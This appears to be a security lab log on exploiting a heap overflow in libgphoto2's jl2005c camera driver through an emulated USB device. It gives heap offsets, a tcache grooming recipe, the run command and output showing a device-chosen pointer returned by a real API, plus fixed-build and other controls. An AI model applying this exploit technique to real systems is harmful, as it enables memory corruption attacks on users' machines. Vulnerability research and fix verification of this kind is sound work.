# W170 (2026-11-24): device-chosen pointer survives the real heap write
#
# Question W166/W168 left open: the :154 memmove writes 464 bytes past
# camera->pl. Is there a live real-libgphoto2 object immediately after that
# allocation whose fields can be steered by device bytes and then read back
# through a real libgphoto2 API? W168's outside grooming failed because
# camera_init's allocation did not reuse the prepared hole. W170 instead
# allocates the victim inside the lab vusb port's bulk-read hook, after
# camera->pl exists, and drains 24 same-size tcache entries so the victim
# lands in the free chunk immediately after camera->pl.
#
# Real: unmodified libgphoto2 2.5.34 jl2005c camlib, camera_init,
# jl2005c_init, gp_port_read, memmove, glibc allocator, CameraFile struct
# and gp_file_get_data_and_size() from the installed libgphoto2.
# Synthetic: the USB device (lab vusb patch), the heap grooming inside the
# device hook, the process canary and saved RIP supplied by the local probe.
# No physical USB, wire, socket, network, external process or command.

## Build (all paths relative to the repository root)
# Plain build tree src/libgphoto2-2.5.34-plain was configured with
# CFLAGS='-O0 -g -fPIC -fno-omit-frame-pointer' and the committed
# live/vusb-jl2005.patch applied. Local-only extra vusb modes are preserved
# as evidence/replay-vusb-victim.patch (apply on top of the committed patch);
# the driver source is evidence/replay-victim_probe.c.
#
#   cd lab/frontier/libgphoto2shell/src/libgphoto2-2.5.34-plain
#   make -C libgphoto2_port && make -C libgphoto2_port install
#   P=$PWD/installdir-plain
#   gcc -O0 -g -rdynamic -fno-omit-frame-pointer -I$P/include \
#     -o ../../live/victim_probe ../../live/victim_probe.c \
#     -L$P/lib -lgphoto2 -lgphoto2_port -Wl,-rpath,$P/lib
#
# Env for every run (P as above):
#   CAMLIBS=$P/lib/libgphoto2/2.5.34
#   IOLIBS=$P/lib/libgphoto2_port/0.12.2 IOLIBS_PREFIX=vusb
#   LD_LIBRARY_PATH=$P/lib
#   port usb:001,001
#
# gdb at jl2005c_init entry with the drain=24 shape:
#   priv      = 0x555555563c80
#   victim    = 0x555555567cd0            (priv + 0x4050, first chunk after)
# The :154 destination is priv+64 (table); the overflow starts at
# priv+0x4040 and reaches the victim's data at priv+0x4050. Device bulk
# offset B therefore maps to victim offset B-0x3E40:
#   accesstype (+0x150) <- bulk 0x3F90
#   size       (+0x158) <- bulk 0x3F98
#   data       (+0x160) <- bulk 0x3FA0
# The probe exports m2s_victim_file, which the patched port locates with
# dlsym(RTLD_DEFAULT,...); it also exports finish() and sets its address as
# the reply's saved RIP and its own %fs:0x28 value as the reply's canary.

## Attack: device-chosen pointer and size returned by a real API
$ env ... M2SHELL_JL2005_VUSB=v M2SHELL_JL2005_COUNT=1022 \
    M2SHELL_VUSB_DRAIN=24 M2SHELL_VUSB_ACCESSTYPE=0 \
    M2SHELL_VUSB_SIZE=0x1a2b3c4d M2SHELL_VUSB_DATA=0x1122334455667788 \
    ./victim_probe usb:001,001
VUSB_VICTIM 0x56132d7d2cd0
VUSB_VICTIM_MODE fill=41 n=16384
VICTIM_ARRIVED 0x56132d7d2cd0
VICTIM+140 = 0x4141414141414141
VICTIM+148 = 0x4141414141414141
VICTIM+150 = 0x0000000000000000          # chosen accesstype = MEMORY
VICTIM+158 = 0x000000001a2b3c4d          # chosen size
VICTIM+160 = 0x1122334455667788          # chosen data pointer
VICTIM+168 = 0x4141414141414141
GP_FILE_GET rc=0 data=0x1122334455667788 size=0x1a2b3c4d

Repeated after the fixed-build control was reversed and the vulnerable
camlib rebuilt: same chosen pointer and size (VICTIM_ARRIVED on a new ASLR
address). The chosen pointer is never dereferenced; gp_file_get_data_and_size
only returns it.

## Controls
count=100, same mode and overrides:
    GP_CAMERA_INIT rc=0 (no RIP diversion)
    no VUSB_VICTIM, no VICTIM_ARRIVED, no GP_FILE_GET line
wrong canary (M2SHELL_JL2005_CANARY=0xdeadbeefdeadbeef), count 1022:
    *** stack smashing detected ***: terminated   (no diversion)
safe fill (M2SHELL_JL2005_FILL=0x00, count 1022, no field overrides):
    VICTIM+150 = 0x0000000000000000
    VICTIM+158 = 0x0000000000000000
    VICTIM+160 = 0x0000000000000000
    GP_FILE_GET rc=0 data=(nil) size=0x0
fixed-source control (pins/fix-6a3393d.patch applied to the local plain
tree, `make -C camlibs`, rebuilt jl2005c.so copied into installdir, rerun):
    GP_CAMERA_INIT rc=0 (no RIP diversion)
    no VUSB_VICTIM, no VICTIM_ARRIVED, no GP_FILE_GET line
    fix then reversed and rebuilt; attack again returns the chosen values.
The fix makes jl2005c_init reject both oversized sizes before the read, so
the port never sees the bulk request and allocates no victim.

## Disposition
Rung 4 now includes a device-chosen pointer and length returned by a real
libgphoto2 API from a live real-build process, with vulnerable, fixed,
safe-input, count-100 and wrong-canary controls. This closes W168's
"no live heap neighbour" result for the specific drain=24 layout. It does
NOT establish rung 5: the canary and saved RIP come from the local probe,
the victim allocation and placement are lab hooks, the chosen pointer is
not dereferenced, no benign command runs, and no wire, physical USB or
independent witness replay exists. Grade stays: local rung 4 at the real
heap/API scope; rung 5 UNKNOWN.
